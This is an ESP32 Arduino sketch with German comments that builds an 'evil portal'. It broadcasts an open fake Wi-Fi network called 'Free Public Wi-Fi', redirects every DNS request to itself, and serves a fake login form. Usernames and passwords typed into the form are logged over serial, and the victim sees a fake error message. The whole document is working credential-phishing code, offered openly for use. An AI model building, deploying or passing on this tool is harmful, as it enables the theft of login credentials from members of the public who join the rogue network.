#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

const char *ssid = "Free Public Wi-Fi";  // Name des Fake-WLANs
const char *password = "";               // Offenes Netzwerk

DNSServer dnsServer;
AsyncWebServer server(80);

void setup() {
  Serial.begin(115200);
  
  // Access Point starten
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("Evil Portal läuft auf: ");
  Serial.println(IP);
  
  // DNS-Server aufsetzen (leitet alle Anfragen auf ESP32 um)
  dnsServer.start(53, "*", IP);

  // Fake-Login-Seite
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<h1>Login erforderlich</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Benutzername'><br><input type='password' name='pass' placeholder='Passwort'><br><input type='submit' value='Login'></form>");
  });

  // Speichert eingegebene Daten
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
    String user = request->arg("user");
    String pass = request->arg("pass");
    Serial.printf("💀 Eingeloggt: %s / %s\n", user.c_str(), pass.c_str());
    request->send(200, "text/plain", "Fehler! Bitte später erneut versuchen.");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
